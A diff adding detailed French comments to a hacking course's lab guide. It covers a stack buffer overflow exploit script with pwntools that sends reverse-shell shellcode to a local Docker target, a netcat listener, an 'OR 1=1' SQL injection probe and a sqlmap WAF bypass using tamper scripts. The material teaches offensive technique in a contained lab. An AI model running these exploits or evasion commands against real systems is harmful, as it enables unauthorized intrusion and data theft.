@@ -71,16 +71,31 @@ Les buffer overflows restent dans le top 3 des vulnérabilités critiques (MITRE
 ### Prérequis
 
 ```bash
+# Démarre le conteneur vulnérable en arrière-plan et reconstruit l'image si nécessaire
+# -d : mode détaché (arrière-plan), --build : rebuild l'image avant de lancer
 docker compose up -d --build buffovf
+
+# Teste la connectivité TCP sur le port 9001 ; si le port est ouvert, affiche "OK"
+# -z : scan TCP sans envoyer de données (zero I/O mode)
 nc -z localhost 9001 && echo "OK"
+
+# Installe pwntools (bibliothèque d'exploitation binaire) en ignorant les restrictions PEP 668
+# --break-system-packages : autorise pip à écrire dans l'environnement système (Debian/Kali)
 pip install --break-system-packages pwntools
+
+# Crée le dossier de travail du lab (récursivement si nécessaire) et s'y déplace
 mkdir -p ~/cours-hacking/jour-3/labs && cd ~/cours-hacking/jour-3/labs
 ```
 
 ### Étape 1 — Test crash
 
 ```bash
+# Se place dans le dossier du lab
 cd ~/cours-hacking/jour-3/labs
+
+# Génère 100 caractères 'A' et les envoie via netcat au service vulnérable (port 9001)
+# 'A'*100 = 100 octets > buffer[64] → débordement dans saved EBP et EIP
+# Le pipe | redirige la sortie de python3 vers l'entrée standard de netcat
 python3 -c "print('A'*100)" | nc localhost 9001
 # → Input received: AAAA... (le programme répond avant de crasher — overflow confirmé)
 ```
@@ -97,39 +112,78 @@ void vulnerable_function(char *input) {
 ```
 
 ```bash
+# Se place dans le dossier du lab
 cd ~/cours-hacking/jour-3/labs
+
+# Crée le script d'exploit via un heredoc (PYEOF = marqueur de fin arbitraire)
+# << 'PYEOF' : le contenu est écrit dans exploit_bof.py jusqu'au marqueur PYEOF
 cat > exploit_bof.py << 'PYEOF'
 #!/usr/bin/env python3
+# Importe la bibliothèque pwntools (exploitation binaire : assembleur, connexions, shellcode)
 from pwn import *
 
+# Configure le contexte pour une architecture Intel x86 32 bits sous Linux
+# context.arch : définit l'assembleur cible (i386 = instructions x86 32 bits)
+# context.os : définit les conventions d'appel système du système d'exploitation cible (linux)
 context.arch = 'i386'
 context.os = 'linux'
 
-# OFFSET = 68 octets (64 buffer + 4 saved EBP)
-# Trouvable avec : cyclic(200) puis cyclic_find(eip_value) dans GDB
+# OFFSET = 68 octets : distance en octets entre le début du buffer[64] et l'adresse de retour (EIP)
+# Décomposition : 64 octets (buffer) + 4 octets (saved EBP = base pointer sauvegardé)
+# Le saved EBP est le pointeur de frame de la fonction appelante, sauvegardé sur la pile avant EIP
+# Méthode de découverte : pwntools cyclic(200) génère un motif unique, puis cyclic_find(valeur_eip)
+# retrouve l'offset exact après crash dans GDB
 OFFSET = 68
 
+# Adresse IP de l'hôte Kali (bridge docker0) vers laquelle le reverse shell se connectera
+# Les conteneurs Docker utilisent docker0 (172.17.0.1) pour joindre l'hôte
 CALLBACK_IP = "172.17.0.1"  # IP du bridge docker0
+# Port d'écoute sur Kali où netcat attendra la connexion inverse
 CALLBACK_PORT = 4444
 
 print(f"[*] Reverse shell -> {CALLBACK_IP}:{CALLBACK_PORT}")
+# shellcraft.i386.linux.connect() : génère un shellcode en assembleur x86 qui :
+#   1. Crée un socket TCP (sys_socketcall)
+#   2. Se connecte à CALLBACK_IP:CALLBACK_PORT (sys_connect)
+#   3. Redirige stdin/stdout/stderr vers le socket (sys_dup2)
+#   4. Exécute /bin/sh (sys_execve)
+# asm() : assemble ce code source en opcodes machine (bytes exécutables)
 shellcode = asm(shellcraft.i386.linux.connect(CALLBACK_IP, CALLBACK_PORT))
 
-# NOP sled : améliore la fiabilité en cas de léger décalage d'adresse
+# NOP sled (toboggan de NOP) : séquence de 100 instructions NOP (0x90)
+# Rôle : absorbe les imprécisions d'adresse mémoire. EIP peut atterrir n'importe où
+# dans cette zone et "glissera" jusqu'au shellcode. Améliore la fiabilité de l'exploit
+# en cas de léger décalage d'adresse (ASLR partiel, différences d'environnement)
 nop_sled = b"\x90" * 100
 
-# Adresse de retour : pointer dans le NOP sled.
+# Adresse de retour injectée dans EIP : pointe vers le début du NOP sled dans la pile
+# Structure mémoire visée : [buffer AAA...][EIP_ADDR][NOP sled][shellcode]
+# Quand la fonction retourne, EIP est chargé avec cette valeur → exécution saute dans le NOP sled
 # À trouver dans GDB : (gdb) run < <(python3 -c "print('A'*200)")
-# Puis : (gdb) x/200x $esp  pour localiser le début du buffer.
+# Puis : (gdb) x/200x $esp  pour localiser le début du buffer sur la pile.
 # Valeur typique sans ASLR : 0xffffcf00 - 0xffffd000
 EIP_ADDR = 0xffffcf70   # <-- À ajuster après analyse GDB
 
+# Construction du payload final :
+#   b"A" * OFFSET   : remplit le buffer[64] + saved EBP (68 octets) avec des 'A' (padding)
+#   p32(EIP_ADDR)   : écrase EIP avec l'adresse mémoire cible (packée en little-endian 32 bits)
+#   nop_sled        : toboggan de NOP pour la fiabilité
+#   shellcode       : code machine du reverse shell
+# p32() convertit un entier 32 bits en 4 octets little-endian (ex: 0xffffcf70 → b'\x70\xcf\xff\xff')
 payload = b"A" * OFFSET + p32(EIP_ADDR) + nop_sled + shellcode
 print(f"[*] Payload : {len(payload)} octets, EIP -> {hex(EIP_ADDR)}")
 
+# Établit une connexion TCP vers la cible vulnérable (localhost:9001) avec un timeout de 10 secondes
+# remote() est l'équivalent pwntools de netcat/socket : gestion automatique de la connexion
 r = remote('localhost', 9001, timeout=10)
+
+# Envoie le payload suivi d'un retour à la ligne (\n)
+# sendline() = send() + newline, ce qui déclenche la lecture par le programme vulnérable
 r.sendline(payload)
 print("[+] Payload envoyé. Vérifiez l'écouteur netcat.")
+
+# Passe en mode interactif : tout ce qui est tapé au clavier est envoyé au reverse shell,
+# et toute réponse du shell distant est affichée localement (lecture/écriture bidirectionnelle)
 r.interactive()
 PYEOF
 echo "Fichier créé : exploit_bof.py"
@@ -138,11 +192,18 @@ echo "Fichier créé : exploit_bof.py"
 ### Étape 3 — Lancer l'attaque
 
 ```bash
-# Terminal 1
+# === Terminal 1 : Écouteur reverse shell ===
+# -l : mode écoute (listen), attend une connexion entrante
+# -v : mode verbeux (verbose), affiche les informations de connexion
+# -n : pas de résolution DNS (évite les latences inutiles)
+# -p 4444 : écoute sur le port TCP 4444
 nc -lvnp 4444
 
-# Terminal 2
+# === Terminal 2 : Lancement de l'exploit ===
+# Se place dans le dossier contenant le script d'exploit
 cd ~/cours-hacking/jour-3/labs
+# Exécute l'exploit BOF : envoie le payload (padding + EIP + NOP sled + shellcode)
+# Si réussi, le shellcode se connecte au Terminal 1 et fournit un shell interactif
 python3 exploit_bof.py
 ```
 
@@ -151,11 +212,17 @@ python3 exploit_bof.py
 ### Diagnostic reverse shell IP
 
 ```bash
-# Trouver l'IP que les conteneurs Docker utilisent pour joindre Kali
+# Extrait l'adresse IP de l'interface docker0 (bridge utilisé par les conteneurs pour joindre l'hôte)
+# ip addr show docker0 : affiche la configuration réseau de l'interface docker0
+# grep 'inet '          : filtre uniquement la ligne contenant l'adresse IPv4 (ignore inet6)
+# awk '{print $2}'      : extrait le champ IP/masque (ex: 172.17.0.1/16)
+# cut -d/ -f1           : retire le masque CIDR pour ne garder que l'adresse IP
 ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
 # → généralement 172.17.0.1
 
-# Vérifier la connectivité
+# Vérifie que le conteneur buffovf-target peut joindre l'hôte Kali via le bridge docker0
+# docker exec : exécute une commande à l'intérieur du conteneur sans shell interactif
+# -c 1 : envoie un seul paquet ICMP (un seul ping, pas de boucle infinie)
 docker exec buffovf-target ping -c 1 172.17.0.1
 ```
 
@@ -188,19 +255,37 @@ flowchart LR
 Dans un terminal :
 
 ```bash
-# Requête normale
+# Requête légitime sans injection SQL : le paramètre id=1 est normal
+# -s : mode silencieux (silent), masque la barre de progression et les erreurs curl
+# -o /dev/null : jette le corps de la réponse HTTP (on ne veut que le code de statut)
+# -w "%{http_code}" : affiche uniquement le code HTTP de la réponse (write-out format)
 curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1"
-# → 200
+# → 200 (OK, pas de détection)
 
-# SQLi brute → bloquée
+# Tentative d'injection SQL avec OR 1=1 (encodage URL : espace → %20)
+# La signature SQLi classique "OR 1=1" est reconnue par le WAF ModSecurity
+# qui bloque la requête avant qu'elle n'atteigne l'application PHP/MySQL
 curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1%20OR%201=1"
-# → 403 (WAF bloque)
+# → 403 (Forbidden, le WAF a détecté et bloqué la signature d'attaque)
 ```
 
 ### Étape 2 — Bypass avec sqlmap
 
 ```bash
+# Se place dans le dossier de travail du lab
 cd ~/cours-hacking/jour-3/labs
+
+# Lance sqlmap contre l'application protégée par WAF avec 3 scripts d'obfuscation
+# -u : URL cible avec le paramètre à tester (id est le point d'injection)
+# --tamper=space2comment,charencode,randomcase : applique successivement 3 scripts de transformation
+#   du payload pour échapper aux signatures statiques du WAF (pattern matching)
+#   - space2comment : remplace les espaces par des commentaires /**/ (fragmente la signature)
+#   - charencode   : encode les caractères spéciaux en URL (%27 au lieu de ')
+#   - randomcase   : randomise la casse des mots-clés SQL (sELeCt au lieu de SELECT)
+# --batch : mode non-interactif, répond automatiquement "oui" à toutes les questions
+# --dbs : une fois l'injection réussie, énumère toutes les bases de données MySQL
+# 2>&1 : redirige la sortie d'erreur (stderr) vers la sortie standard (stdout)
+# | tee sqlmap_waf_bypass.txt : affiche ET enregistre simultanément dans un fichier
 sqlmap -u "http://localhost:8081/?id=1" \
   --tamper=space2comment,charencode,randomcase \
   --batch --dbs 2>&1 | tee sqlmap_waf_bypass.txt
@@ -227,10 +312,21 @@ sqlmap -u "http://localhost:8081/?id=1" \
 <details><summary><strong>Solution</strong></summary>
 
 ```bash
+# Ouvre un shell bash interactif dans le conteneur buffovf-target
+# -i : mode interactif (stdin attaché au terminal)
+# -t : alloue un pseudo-TTY (terminal virtuel) pour un affichage correct
 docker exec -it buffovf-target bash
+
+# Se place dans /opt et lance GDB en mode silencieux sur le binaire vulnérable
+# -q : quiet, supprime le message de bienvenue GDB
 cd /opt && gdb -q ./vuln
+
+# Dans GDB : exécute le programme avec 100 'A' en entrée pour provoquer le buffer overflow
+# < <(...) : substitution de processus — l'entrée standard de run est redirigée
+# depuis la sortie de python3. Le programme crashe et GDB affiche la valeur de EIP
+# écrasée (normalement 0x41414141 = 'AAAA' en ASCII), confirmant le contrôle du flux.
 (gdb) run < <(python3 -c "print('A'*100)")
-# Noter la valeur de EIP après crash
+# Noter la valeur de EIP après crash (ex: EIP = 0x41414141 → les 'A' ont bien écrasé l'adresse de retour)
 ```
 </details>
 
